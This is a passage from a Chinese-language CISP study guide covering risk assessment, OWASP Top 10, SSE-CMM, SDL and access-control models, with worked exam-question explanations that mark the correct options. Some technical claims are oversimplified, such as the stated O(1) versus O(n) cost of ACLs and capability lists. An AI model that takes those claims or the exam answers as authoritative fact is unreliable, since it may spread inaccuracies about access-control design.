消除风险源 风险过高且可避免 缓解 降低风险 风险可接受但需控制 转移 转移给第三方 可通过保险等转移 接受 接受残余风险 风险很低或成本过高 4.2 风险评估方法 常用风险评估方法： 风险评估方法： ├── 定性评估 │ ├── 专家判断 │ ├── 风险矩阵 │ └── 场景分析 ├── 定量评估 │ ├── 年度损失期望（ALE） │ ├── 投资回报率（ROI） │ └── 成本效益分析 └── 混合方法 ├── FAIR（Factor Analysis of Information Risk） ├── OCTAVE（Operationally Critical Threat, Asset, and Vulnerability Evaluation） └── NIST风险管理框架 五、安全知识 5.1 安全原则 核心安全原则： graph TB A[\"安全原则\"] B[\"最小权限\"] C[\"纵深防御\"] D[\"失败安全\"] E[\"完全中介\"] F[\"开放设计\"] G[\"权限分离\"] A --> B A --> C A --> D A --> E A --> F A --> G B --> B1[\"仅授予必要权限\"] C --> C1[\"多层安全控制\"] D --> D1[\"失败时保持安全\"] E --> E1[\"检查每次访问\"] F --> F1[\"不依赖隐蔽性\"] G --> G1[\"分散权力\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#fce4ec,stroke:#c2185b style G fill:#e1f5fe,stroke:#0277bd 5.2 常见漏洞类型 OWASP Top 10（2021）： 排名 漏洞类型 说明 A01 失效的访问控制 未正确实施访问限制 A02 加密机制失效 敏感数据未加密或加密不当 A03 注入 SQL注入、命令注入等 A04 不安全设计 设计阶段的安全缺陷 A05 安全配置错误 不安全的默认配置 A06 易受攻击和过时的组件 使用有漏洞的第三方组件 A07 身份识别和身份验证失效 认证机制缺陷 A08 软件和数据完整性失效 未验证完整性 A09 安全日志和监控失效 缺乏有效监控 A10 服务器端请求伪造（SSRF） 服务器被诱导发起请求 5.3 安全设计模式 常用安全设计模式： 安全设计模式： ├── 认证和授权 │ ├── 单点登录（SSO） │ ├── 基于角色的访问控制（RBAC） │ └── OAuth 2.0 ├── 数据保护 │ ├── 加密存储 │ ├── 传输加密（TLS&#x2F;SSL） │ └── 数据脱敏 ├── 输入验证 │ ├── 白名单验证 │ ├── 参数化查询 │ └── 输出编码 └── 会话管理 ├── 安全会话令牌 ├── 会话超时 └── 会话固定防护 六、系统安全工程能力成熟度模型（SSE-CMM） 6.1 SSE-CMM概述 系统安全工程-能力成熟度模型（SSE-CMM，Systems Security Engineering Capability Maturity Model）是评估和改进组织安全工程能力的框架。 SSE-CMM的核心理念： graph TB A[\"SSE-CMM\"] B[\"安全工程\"] C[\"能力成熟度\"] D[\"持续改进\"] A --> B A --> C A --> D B --> B1[\"系统化方法\"] B --> B2[\"工程化实践\"] B --> B3[\"全生命周期\"] C --> C1[\"5个成熟度级别\"] C --> C2[\"22个过程域\"] C --> C3[\"可度量\"] D --> D1[\"评估\"] D --> D2[\"改进\"] D --> D3[\"验证\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 6.2 SSE-CMM的正确理解 🚨 SSE-CMM的错误理解错误说法：基于SSE-CMM的工程是独立工程，与软件工程、硬件工程、通信工程等分别规划实施 ❌ 为什么这是错误的： SSE-CMM强调安全工程应该集成到其他工程中，而不是独立存在。 正确理解： ✅ 安全工程应融入软件工程 ✅ 安全工程应融入硬件工程 ✅ 安全工程应融入通信工程 ✅ 安全工程应融入系统工程 ❌ 不是独立的、分离的工程 💡 SSE-CMM的正确理解A. SSE-CMM要求实施组织与其他组织相互作用 ✅ 正确 需要与开发方、产品供应商、集成商、咨询服务商等协作 安全工程不是孤立的 B. SSE-CMM可以使安全工程成为一个确定的、成熟的和可度量的科目 ✅ 正确 通过成熟度模型使安全工程规范化 可以度量和评估安全工程能力 支持持续改进 C. 基于SSE-CMM的工程是独立工程 ❌ 错误 安全工程应该集成到其他工程中 不是独立规划和实施 需要与其他工程协同 D. SSE-CMM覆盖整个组织的活动 ✅ 正确 包括管理、组织和工程活动 不仅仅是系统安全的工程活动 是全面的能力评估框架 SSE-CMM的关键特征： 特征 说明 重要性 集成性 与其他工程集成，不是独立工程 ⭐⭐⭐⭐⭐ 全面性 覆盖管理、组织、工程活动 ⭐⭐⭐⭐⭐ 协作性 与多方组织相互作用 ⭐⭐⭐⭐ 可度量性 确定的、成熟的、可度量的 ⭐⭐⭐⭐⭐ 持续改进 支持能力提升 ⭐⭐⭐⭐⭐ 6.3 SSE-CMM的成熟度级别 5个成熟度级别： graph TB A[\"SSE-CMM成熟度级别\"] B[\"Level 1执行非正式\"] C[\"Level 2计划和跟踪\"] D[\"Level 3定义良好\"] E[\"Level 4定量控制\"] F[\"Level 5持续改进\"] A --> B B --> C C --> D D --> E E --> F B --> B1[\"基本实践\"] C --> C1[\"项目管理\"] D --> D1[\"标准化\"] E --> E1[\"量化管理\"] F --> F1[\"优化\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#ffccbc,stroke:#d84315 style D fill:#fff3e0,stroke:#f57c00 style E fill:#c8e6c9,stroke:#2e7d32 style F fill:#e3f2fd,stroke:#1976d2 各级别特征： 级别 名称 特征 关键实践 1 执行非正式 临时的、混乱的 基本安全实践 2 计划和跟踪 项目级管理 项目计划、跟踪 3 定义良好 组织级标准化 标准过程、培训 4 定量控制 量化管理 度量、统计控制 5 持续改进 优化 缺陷预防、技术创新 6.4 SSE-CMM的过程域 22个过程域分类： SSE-CMM过程域： ├── 工程过程域（11个） │ ├── 管理安全控制 │ ├── 评估影响 │ ├── 评估安全风险 │ ├── 评估威胁 │ ├── 评估脆弱性 │ ├── 建立保证论据 │ ├── 协调安全 │ ├── 监控安全态势 │ ├── 提供安全输入 │ ├── 规定安全需求 │ └── 验证和确认安全 ├── 项目过程域（6个） │ ├── 确保质量 │ ├── 管理配置 │ ├── 管理项目风险 │ ├── 监控和控制技术工作 │ ├── 计划技术工作 │ └── 定义系统工程过程 └── 组织过程域（5个） ├── 改进组织系统工程过程 ├── 管理产品线演进 ├── 管理系统工程支持环境 ├── 提供持续技能和知识 └── 协调与供应商 6.5 SSE-CMM与其他模型的关系 模型对比： 模型 关注点 范围 关系 SSE-CMM 安全工程能力 组织安全工程 专注安全 CMM/CMMI 软件/系统工程能力 组织工程能力 通用框架 ISO 27001 信息安全管理 信息安全管理体系 管理体系 SDL 安全开发 软件开发生命周期 开发实践 SSE-CMM的价值： 📊 评估组织安全工程能力 🎯 识别改进机会 📈 指导能力提升 ✅ 验证改进效果 🏆 获得客户信任 七、软件安全开发实践 7.1 软件安全开发的关键措施 软件公司频繁出现软件运行时被黑客远程攻击获取数据的现象，需要加强软件安全开发管理。 软件安全开发措施评估： graph TB A[\"软件安全开发措施\"] B[\"✅ 直接有效\"] C[\"❌ 无直接帮助\"] A --> B A --> C B --> B1[\"安全意识培训\"] B --> B2[\"安全编码准则\"] B --> B3[\"安全测试\"] C --> C1[\"敏捷开发模型\"] B1 --> B1A[\"提高安全意识\"] B2 --> B2A[\"规范编码\"] B3 --> B3A[\"发现漏洞\"] C1 --> C1A[\"开发方法\"] C1 --> C1B[\"不解决安全问题\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#ffcdd2,stroke:#b71c1c 🚨 对解决问题没有直接帮助的措施错误措施：要求开发人员采用敏捷开发模型进行开发 ❌ 为什么没有直接帮助： 📋 敏捷开发是开发方法 敏捷开发关注开发效率和灵活性 不是专门针对安全问题的解决方案 本身不包含安全实践 需要额外集成安全活动 🎯 问题的根源 软件被远程攻击获取数据 根本原因是安全漏洞 需要安全编码和测试 不是开发方法的问题 ⚖️ 敏捷与安全 敏捷开发可以集成安全实践（安全敏捷） 但敏捷本身不解决安全问题 需要明确的安全活动 单纯采用敏捷不能解决安全问题 各项措施分析： 措施 直接性 有效性 对问题的帮助 A. 采用敏捷开发模型 ❌ 间接 ⭐⭐ ❌ 无直接帮助 B. 安全意识培训 ✅ 直接 ⭐⭐⭐⭐ ✅ 有直接帮助 C. 安全编码准则 ✅ 直接 ⭐⭐⭐⭐⭐ ✅ 有直接帮助 D. 安全测试环节 ✅ 直接 ⭐⭐⭐⭐⭐ ✅ 有直接帮助 💡 有效的安全措施B. 要求所有的开发人员参加软件安全意识培训 ✅ 提高开发人员安全意识 ✅ 了解常见安全漏洞 ✅ 学习安全编码实践 ✅ 从源头减少安全问题 C. 要求规范软件编码，并制定公司的安全编码准则 ✅ 建立安全编码标准 ✅ 防止常见安全漏洞 ✅ 统一安全实践 ✅ 可执行、可检查 D. 要求增加软件安全测试环节，尽早发现软件安全问题 ✅ 在发布前发现漏洞 ✅ 降低安全风险 ✅ 验证安全控制 ✅ 持续改进 7.2 软件安全开发的完整方案 综合安全开发策略： 软件安全开发完整方案： ├── 人员层面 │ ├── 安全意识培训 │ ├── 安全技能培训 │ ├── 定期安全更新 │ └── 安全文化建设 ├── 过程层面 │ ├── 安全需求分析 │ ├── 威胁建模 │ ├── 安全设计审查 │ ├── 安全编码 │ ├── 代码审查 │ ├── 安全测试 │ └── 安全发布 ├── 技术层面 │ ├── 安全编码准则 │ ├── 安全开发工具 │ ├── 静态代码分析 │ ├── 动态安全测试 │ ├── 渗透测试 │ └── 漏洞管理 └── 管理层面 ├── 安全策略制定 ├── 安全度量 ├── 安全审计 ├── 持续改进 └── 应急响应 开发方法与安全的关系： 开发方法 特点 安全集成 说明 瀑布模型 顺序开发 在各阶段加入安全活动 传统方法 敏捷开发 迭代开发 每个迭代包含安全活动 需要安全敏捷 DevOps 持续交付 DevSecOps 安全左移 螺旋模型 风险驱动 每个螺旋包含安全评估 适合高风险项目 💡 安全敏捷开发如何在敏捷开发中集成安全： 🔄 每个迭代 安全用户故事 安全验收标准 安全测试 安全回顾 📋 Sprint计划 包含安全任务 分配安全时间 安全优先级 ✅ 完成定义 通过安全测试 无高危漏洞 代码审查通过 👥 团队角色 安全冠军 安全专家支持 全员安全意识 7.3 解决远程攻击问题的具体措施 针对远程攻击的防护措施： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_14951916f')); var option = { \"title\": { \"text\": \"软件安全措施有效性对比\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"xAxis\": { \"type\": \"category\", \"data\": [\"安全培训\", \"编码准则\", \"安全测试\", \"敏捷开发\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"有效性\", \"max\": 100 }, \"series\": [{ \"type\": \"bar\", \"data\": [ {\"value\": 75, \"itemStyle\": {\"color\": \"#4caf50\"}}, {\"value\": 95, \"itemStyle\": {\"color\": \"#2e7d32\"}}, {\"value\": 90, \"itemStyle\": {\"color\": \"#388e3d\"}}, {\"value\": 30, \"itemStyle\": {\"color\": \"#f44336\"}} ], \"label\": { \"show\": true, \"position\": \"top\" } }] }; chart.setOption(option); } })(); 常见远程攻击类型及防护： 攻击类型 防护措施 编码准则 测试方法 SQL注入 参数化查询 禁止拼接SQL SQL注入测试 XSS 输出编码 验证和编码 XSS扫描 远程代码执行 输入验证 禁止eval 模糊测试 文件上传漏洞 类型检查 白名单验证 上传测试 认证绕过 强认证 安全会话管理 认证测试 权限提升 最小权限 权限检查 授权测试 八、安全开发生命周期 8.1 SDL模型 Microsoft SDL（Security Development Lifecycle）： graph LR A[\"培训\"] --> B[\"需求\"] B --> C[\"设计\"] C --> D[\"实现\"] D --> E[\"验证\"] E --> F[\"发布\"] F --> G[\"响应\"] A --> A1[\"安全培训\"] B --> B1[\"安全需求\"] C --> C1[\"威胁建模\"] D --> D1[\"安全编码\"] E --> E1[\"安全测试\"] F --> F1[\"安全响应计划\"] G --> G1[\"事件响应\"] style A fill:#e8eaf6,stroke:#3f51b5 style B fill:#f3e5f5,stroke:#9c27b0 style C fill:#e0f2f1,stroke:#009688 style D fill:#fff3e0,stroke:#ff9800 style E fill:#e8f5e9,stroke:#388e3d style F fill:#fce4ec,stroke:#c2185b style G fill:#ffebee,stroke:#c62828 SDL各阶段活动： 阶段 主要活动 交付物 培训 安全意识培训、技术培训 培训记录 需求 安全需求分析、合规要求 安全需求文档 设计 威胁建模、架构审查 威胁模型、设计文档 实现 安全编码、代码审查 安全代码 验证 安全测试、渗透测试 测试报告 发布 最终安全审查、响应计划 发布批准 响应 漏洞响应、补丁管理 安全更新 九、总结 软件安全的核心要点： BSI模型：将安全内建到软件过程中，使用工程化方法 三大支柱：应用风险管理、软件安全接触点和安全知识 接触点：在开发生命周期关键点应用安全实践 风险管理：识别、评估、处置和监控安全风险 安全知识：掌握安全原则、漏洞模式和最佳实践 SDL：将安全融入整个开发生命周期 🎯 关键要点 BSI强调将安全内建到软件过程中，贯穿整个生命周期 提出的软件安全三大支柱：应用风险管理、软件安全接触点和安全知识 安全测试是软件安全接触点的一部分，不是独立的支柱 软件安全接触点包括代码审核、架构风险分析、渗透测试等 应用风险管理是战略层面的安全管理 安全知识是软件安全的基础 安全应该融入软件开发生命周期的每个阶段 💡 实践建议 建立安全开发生命周期（SDL） 定期进行安全培训 在设计阶段进行威胁建模 实施代码审核和安全测试 建立漏洞响应机制 持续监控和改进安全实践","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：访问控制","slug":"2025/10/CISP-Access-Control-zh-CN","date":"un66fin66","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Access-Control/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Access-Control/","excerpt":"深入解析CISP认证中的访问控制知识点，涵盖安全模型、访问控制策略和强制访问控制。","text":"访问控制是信息安全的核心机制，通过限制对资源的访问来保护信息资产的机密性、完整性和可用性。 一、访问控制概述 1.1 访问控制的定义与作用 💡 CIA三要素访问控制保护信息资产的机密性、完整性和可用性。详细内容请参考：CISP学习指南：信息安全CIA三要素 访问控制是信息安全的核心机制，通过限制对资源的访问来保护信息资产。 🔐 访问控制的作用访问控制系统在信息系统中发挥着至关重要的作用，主要包括： ✅ 拒绝非法用户的非授权访问请求 防止未经授权的用户访问系统 阻止非法入侵 保护系统资源 ✅ 在用户对系统资源提供最大限度共享的基础上，对用户的访问权进行管理 平衡共享与安全 根据需要授予权限 实现资源的有效利用 ✅ 防止对信息的非授权篡改和滥用 保护数据完整性 防止权限滥用 确保操作合规性 ❌ 错误理解：对经过身份鉴别后的合法用户提供所有服务 这是对访问控制作用的错误理解 即使是合法用户，也应根据权限提供服务 不能因为身份合法就提供所有访问权限 访问控制实例：教务系统 以学校教务系统为例： graph TB A[\"教务系统\"] B[\"教师\"] C[\"学生\"] D[\"教务管理员\"] A --> B A --> C A --> D B --> B1[\"可以：录入成绩\"] B --> B2[\"不可以：修改课程信息\"] C --> C1[\"可以：查看自己的分数\"] C --> C2[\"不可以：查看他人分数\"] C --> C3[\"不可以：修改成绩\"] D --> D1[\"可以：修改课程信息\"] D --> D2[\"可以：管理选课信息\"] D --> D3[\"不可以：直接修改成绩\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 访问控制在教务系统中的作用： 用户类型 身份鉴别 授权访问 访问控制作用 教师 ✅ 合法 录入成绩 ✅ 允许授权操作 教师 ✅ 合法 修改课程 ❌ 拒绝非授权操作 学生 ✅ 合法 查看自己分数 ✅ 允许授权访问 学生 ✅ 合法 查看他人分数 ❌ 拒绝非授权访问 学生 ✅ 合法 修改成绩 ❌ 防止非授权篡改 教务管理员 ✅ 合法 管理课程信息 ✅ 允许授权管理 非法用户 ❌ 非法 任何访问 ❌ 拒绝所有访问 关键理解： 身份鉴别 ≠ 全部权限 身份鉴别只是确认“你是谁” 访问控制决定“你能做什么” 合法用户也需要权限管理 最小权限原则 用户只能访问完成工作所需的资源 不因为是合法用户就给予所有权限 每个用户的权限根据角色确定 共享与安全的平衡 允许合理的资源共享 但必须在安全的框架内 通过访问控制实现平衡 1.2 主体和客体 访问控制模型将实体划分为主体和客体两类，通过对主体身份的识别来限制其对客体的访问权限。 💡 主体、客体和访问权限的核心概念关键理解： ✅ 主体的特征 对文件进行操作的用户是一种主体 主体是主动发起访问的实体 用户对文件进行操作是主动行为 ✅ 主体与客体的交互 主体可以接受客体的信息和数据（读取） 主体也可能改变客体相关的信息（修改） 具体操作取决于访问权限 ✅ 访问权限的定义 访问权限是指主体对客体所允许的操作 如：读、写、执行、删除等 是访问控制的核心概念 主体和客体的定义： graph LR A[\"主体Subject\"] B[\"访问权限Permission\"] C[\"客体Object\"] A -->|\"1. 请求访问\"| B B -->|\"2. 检查权限\"| B B -->|\"3. 允许/拒绝\"| C A --> A1[\"用户\"] A --> A2[\"进程\"] A --> A3[\"程序\"] C --> C1[\"文件\"] C --> C2[\"目录\"] C --> C3[\"数据库\"] B --> B1[\"读\"] B --> B2[\"写\"] B --> B3[\"执行\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3c 主体、客体和访问权限的关系： 概念 定义 示例 特点 主体 主动发起访问的实体 用户、进程、程序 主动性 客体 被访问的资源 文件、目录、数据库 被动性 访问权限 主体对客体允许的操作 读、写、执行 操作类型 常见的主体类型： 主体类型： ├── 用户（User） │ ├── 人类用户 │ ├── 系统用户 │ └── 服务账户 ├── 进程（Process） │ ├── 用户进程 │ └── 系统进程 ├── 程序（Program） │ ├── 应用程序 │ └── 系统程序 └── 设备（Device） ├── 网络设备 └── 外设 常见的客体类型： 客体类型： ├── 文件（File） │ ├── 普通文件 │ ├── 配置文件 │ └── 日志文件 ├── 目录（Directory） │ ├── 文件夹 │ └── 目录树 ├── 数据库（Database） │ ├── 表 │ ├── 视图 │ └── 存储过程 ├── 网络资源（Network Resource） │ ├── 网络共享 │ └── 网络服务 └── 设备（Device） ├── 打印机 └── 存储设备 访问权限的类型： 资源类型 常见权限 说明 文件 读（Read） 读取文件内容 文件 写（Write） 修改文件内容 文件 执行（Execute） 执行文件 文件 删除（Delete） 删除文件 目录 读（Read） 查看目录内容 目录 写（Write） 在目录中创建/删除文件 目录 执行（Execute） 进入目录 目录 列表（List） 列出目录内容 数据库 SELECT 查询数据 数据库 INSERT 插入数据 数据库 UPDATE 更新数据 数据库 DELETE 删除数据 为什么选项D错误： ⚠️ 常见误区错误说法：对目录的访问权可分为读、写和拒绝访问 ❌ 问题： &quot;拒绝访问&quot;不是一种访问权限 它是访问控制的结果 混淆了权限和控制结果 ✅ 正确理解： 访问权限：读、写、执行、列表等 访问控制结果：允许访问、拒绝访问 拒绝访问是因为没有相应权限 访问权限 vs 访问控制结果： graph TB A[\"主体请求访问\"] B[\"检查访问权限\"] C[\"有权限？\"] D[\"允许访问\"] E[\"拒绝访问\"] A --> B B --> C C -->|\"Yes\"| D C -->|\"No\"| E B --> B1[\"读权限\"] B --> B2[\"写权限\"] B --> B3[\"执行权限\"] D --> D1[\"访问控制结果\"] E --> E1[\"访问控制结果\"] style B fill:#e3f2fd,stroke:#1976d2 style D fill:#c8e6c9,stroke:#2e7d32 style E fill:#ffcdd2,stroke:#c62828 Unix/Linux目录权限示例： # 目录权限 # drwxr-xr-x # d: 目录 # rwx: 所有者权限（读、写、执行） # r-x: 组权限（读、执行） # r-x: 其他用户权限（读、执行） # 目录权限含义： # r (read): 可以列出目录内容 # w (write): 可以在目录中创建、删除文件 # x (execute): 可以进入目录 # 没有权限的结果：拒绝访问 # 但“拒绝访问”不是一种权限 1.3 访问控制的目标 访问控制的三大目标是保护信息的机密性、完整性和可用性（CIA三要素）。 二、安全模型分类 2.1 机密性模型 保护分级信息机密性的模型： 保护分级信息机密性的模型包括：Bell-LaPadula模型和信息流模型。 graph TB A[\"机密性模型\"] B[\"Bell-LaPadula模型\"] C[\"信息流模型\"] A --> B A --> C B --> B1[\"军事和政府\"] B --> B2[\"多级安全\"] B --> B3[\"上读下写规则\"] C --> C1[\"信息流向控制\"] C --> C2[\"防止信息泄露\"] C --> C3[\"格模型基础\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d 💡 机密性模型的选择为什么选择这两个模型： ✅ Bell-LaPadula模型 专门设计用于保护机密性 基于多级安全策略 防止信息向下流动 ✅ 信息流模型 控制信息流向 防止信息泄露 支持机密性保护 ❌ 不是机密性模型： Biba模型 - 保护完整性 Clark-Wilson模型 - 保护完整性 Chinese Wall模型 - 多边安全 2.2 完整性模型 保护数据完整性的模型： 完整性模型包括：Biba模型和Clark-Wilson模型。 graph TB A[\"完整性模型\"] B[\"Biba模型\"] C[\"Clark-Wilson模型\"] A --> B A --> C B --> B1[\"下读上写\"] B --> B2[\"防止污染\"] B --> B3[\"完整性级别\"] C --> C1[\"商业环境\"] C --> C2[\"良构事务\"] C --> C3[\"职责分离\"] style B fill:#fff3e0,stroke:#f57c00 style C fill:#f3e5f5,stroke:#7b1fa2 💡 完整性模型对比两种完整性模型的区别： Biba模型： 🔒 基于完整性级别 📊 下读上写规则 🛡️ 防止低完整性数据污染高完整性数据 Clark-Wilson模型： 💼 面向商业环境 ✅ 良构事务（Well-Formed Transactions） 👥 职责分离（Separation of Duties） 🔐 访问三元组（用户-程序-数据） 完整性模型对比： 模型 适用场景 核心机制 特点 Biba 军事、政府 完整性级别、下读上写 简单、形式化 Clark-Wilson 商业、金融 良构事务、职责分离 实用、灵活 2.3 多边安全模型 多边安全模型： 多边安全模型包括：Chinese Wall模型和BMA模型。 graph TB A[\"多边安全模型\"] B[\"Chinese Wall模型\"] C[\"BMA模型\"] A --> B A --> C B --> B1[\"金融机构\"] B --> B2[\"利益冲突防范\"] B --> B3[\"动态访问控制\"] C --> C1[\"医疗资料\"] C --> C2[\"隐私保护\"] C --> C3[\"患者数据安全\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#c8e6c9,stroke:#2e7d32 💡 多边安全模型的应用Chinese Wall模型（金融机构）： 🏦 防止利益冲突 🔒 动态访问控制 📊 信息隔离墙 💼 适用于投资银行、咨询公司 BMA模型（医疗资料）： 🏥 保护患者隐私 📋 医疗数据安全 🔐 访问权限管理 ⚕️ 符合医疗法规 多边安全模型应用对比： 模型 主要应用 保护对象 核心机制 Chinese Wall 金融机构 商业机密、利益冲突 动态访问控制、信息隔离 BMA 医疗机构 患者隐私、医疗数据 角色权限、数据分类 三、Bell-LaPadula模型（BLP） 3.1 BLP模型规则 BLP模型基于两种规则保障数据的机密性和敏感度： graph TB A[\"BLP模型规则\"] B[\"简单安全特性Simple Security\"] C[\"*特性Star Property\"] A --> B A --> C B --> B1[\"No Read Up\"] B --> B2[\"上读规则\"] B --> B3[\"主体不可读安全级别高于它的数据\"] C --> C1[\"No Write Down\"] C --> C2[\"下写规则\"] C --> C3[\"主体不可写安全级别低于它的数据\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 💡 BLP模型的核心规则两条规则： 📖 上读（No Read Up） 主体不可读安全级别高于它的数据 防止低级别用户读取高级别信息 保护机密信息不被泄露 ✍️ 下写（No Write Down） 主体不可写安全级别低于它的数据 防止高级别信息流向低级别 防止机密信息降级 BLP模型示例： 安全级别（从低到高）： 公开 &lt; 内部 &lt; 机密 &lt; 绝密 用户级别：机密 ✅ 可以读取：公开、内部、机密（向下读） ❌ 不能读取：绝密（不能上读） ✅ 可以写入：机密、绝密（向上写） ❌ 不能写入：公开、内部（不能下写） 3.2 BLP模型的应用 BLP模型适用场景： 场景 说明 示例 军事系统 多级安全分类 绝密、机密、秘密、公开 政府机构 文件分级管理 内部文件、公开文件 企业 商业秘密保护 核心机密、一般机密 四、Biba模型 4.1 Biba模型规则 Biba模型基于两种规则保障数据的完整性： graph TB A[\"Biba模型规则\"] B[\"简单完整性特性\"] C[\"*完整性特性\"] A --> B A --> C B --> B1[\"No Read Down\"] B --> B2[\"下读规则\"] B --> B3[\"主体不可读安全级别低于它的数据\"] C --> C1[\"No Write Up\"] C --> C2[\"上写规则\"] C --> C3[\"主体不可写安全级别高于它的数据\"] style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 💡 Biba模型的核心规则两条规则： 📖 下读（No Read Down） 主体不可读安全级别低于它的数据 防止低完整性数据污染高完整性数据 保护数据完整性 ✍️ 上写（No Write Up） 主体不可写安全级别高于它的数据 防止低完整性主体修改高完整性数据 维护数据可信度 Biba模型示例： 完整性级别（从低到高）： 未验证 &lt; 已验证 &lt; 可信 &lt; 高度可信 用户级别：已验证 ✅ 可以读取：已验证、可信、高度可信（向上读） ❌ 不能读取：未验证（不能下读） ✅ 可以写入：未验证、已验证（向下写） ❌ 不能写入：可信、高度可信（不能上写） 4.2 BLP vs Biba对比 两种模型的对比： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_5c11cccf8')); var option = { \"title\": { \"text\": \"BLP模型 vs Biba模型\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"BLP（机密性）\", \"Biba（完整性）\"] }, \"radar\": { \"indicator\": [ {\"name\": \"读取控制\", \"max\": 100}, {\"name\": \"写入控制\", \"max\": 100}, {\"name\": \"机密性保护\", \"max\": 100}, {\"name\": \"完整性保护\", \"max\": 100}, {\"name\": \"实用性\", \"max\": 100} ] }, \"series\": [{ \"type\": \"radar\", \"data\": [ { \"value\": [90, 90, 100, 30, 70], \"name\": \"BLP（机密性）\", \"itemStyle\": {\"color\": \"#2196f3\"} }, { \"value\": [90, 90, 30, 100, 80], \"name\": \"Biba（完整性）\", \"itemStyle\": {\"color\": \"#4caf50\"} } ] }] }; chart.setOption(option); } })(); 特性 BLP模型 Biba模型 保护目标 机密性 完整性 读取规则 上读（No Read Up） 下读（No Read Down） 写入规则 下写（No Write Down） 上写（No Write Up） 防止 信息泄露 数据污染 适用场景 军事、政府 商业、工业 ⚠️ 记忆技巧BLP vs Biba规则记忆： BLP（机密性）： 📖 上读 - 不能读高级别（防泄密） ✍️ 下写 - 不能写低级别（防降级） 口诀：上读下写 Biba（完整性）： 📖 下读 - 不能读低级别（防污染） ✍️ 上写 - 不能写高级别（防篡改） 口诀：下读上写 关系：Biba是BLP的对偶模型 五、访问控制实现机制 5.1 访问控制实现方法 在实现访问控制时，有多种不同的机制和模型可以选择。对于大量用户的信息系统，需要考虑时间和资源消耗。 📊 访问控制实现机制对比两种主要实现机制： 访问控制列表（ACL，Access Control List） 以客体（资源）为中心 每个资源维护一个列表，记录哪些用户可以访问 适合大量用户的系统 能力表（CL，Capability List） 以主体（用户）为中心 每个用户维护一个列表，记录可以访问哪些资源 适合大量资源的系统 5.2 ACL vs CL对比 两种机制的核心区别： graph TB subgraph ACL[\"访问控制列表 ACL\"] A1[\"文件A\"] A2[\"用户列表\"] A1 --> A2 A2 --> A3[\"用户1: 读\"] A2 --> A4[\"用户2: 读写\"] A2 --> A5[\"用户3: 执行\"] end subgraph CL[\"能力表 CL\"] C1[\"用户1\"] C2[\"资源列表\"] C1 --> C2 C2 --> C3[\"文件A: 读\"] C2 --> C4[\"文件B: 读写\"] C2 --> C5[\"文件C: 执行\"] end style ACL fill:#e3f2fd,stroke:#1976d2 style CL fill:#e8f5e9,stroke:#388e3d 详细对比： 特征 访问控制列表（ACL） 能力表（CL） 组织方式 以客体（资源）为中心 以主体（用户）为中心 存储位置 与资源关联 与用户关联 列表内容 哪些用户可以访问此资源 此用户可以访问哪些资源 适用场景 用户数量大，资源数量少 资源数量大，用户数量少 权限检查 检查资源的ACL 检查用户的CL 权限回收 从资源的ACL中删除用户 从用户的CL中删除资源 时间复杂度 O(1) - 直接查找资源 O(n) - 需遍历用户列表 空间复杂度 资源数 × 平均用户数 用户数 × 平均资源数 5.3 大量用户系统的最佳选择 ✅ 大量用户系统的访问控制实现对于存在大量用户的信息系统，从时间和资源消耗的角度，应该采用访问控制列表（ACL）。 为什么ACL更适合大量用户系统： 权限检查效率高 ⚡ 直接定位到资源 📊 检查资源的ACL即可 ⏱️ 时间复杂度O(1) 空间开销合理 💾 通常资源数量 &lt; 用户数量 📉 存储开销相对较小 📊 每个资源的ACL通常不会太长 管理简便 🛠️ 权限集中在资源上 🔍 易于审计资源访问情况 🔄 易于维护和更新 实际场景对比： 场景：企业信息系统 - 用户数量：10,000人 - 资源数量：1,000个文件&#x2F;系统 使用ACL： ├── 存储：1,000个资源 × 平均100个用户 &#x3D; 100,000条记录 ├── 检查：直接定位资源，查找用户 └── 时间：O(1) 使用CL： ├── 存储：10,000个用户 × 平均10个资源 &#x3D; 100,000条记录 ├── 检查：需要遍历用户列表找到用户 └── 时间：O(n)，最坏情况需要检查10,000个用户 结论：ACL更高效 5.4 其他选项分析 各种方案对比： 方案 类型 适用场景 大量用户系统 时间效率 ACL 实现机制 自主访问控制 ✅ 适合 ⚡ 高 CL 实现机制 自主访问控制 ❌ 不适合 🐌 低 BLP模型 安全模型 强制访问控制（机密性） ❌ 不适用 - Biba模型 安全模型 强制访问控制（完整性） ❌ 不适用 - 选项分析： A. 访问控制列表（ACL）—— 正确答案 ✅ 是实现自主访问控制的机制 ✅ 适合大量用户的系统 ✅ 时间和资源消耗合理 ✅ 广泛应用于实际系统 B. 能力表（CL） ✅ 也是实现自主访问控制的机制 ❌ 但不适合大量用户的系统 ❌ 权限检查需要遍历用户列表 ❌ 时间消耗高 C. BLP模型 ❌ 是安全模型，不是实现机制 ❌ 用于强制访问控制，不是自主访问控制 ❌ 主要保护机密性 ❌ 不适用于大量用户系统的实现 D. Biba模型 ❌ 是安全模型，不是实现机制 ❌ 用于强制访问控制，不是自主访问控制 ❌ 主要保护完整性 ❌ 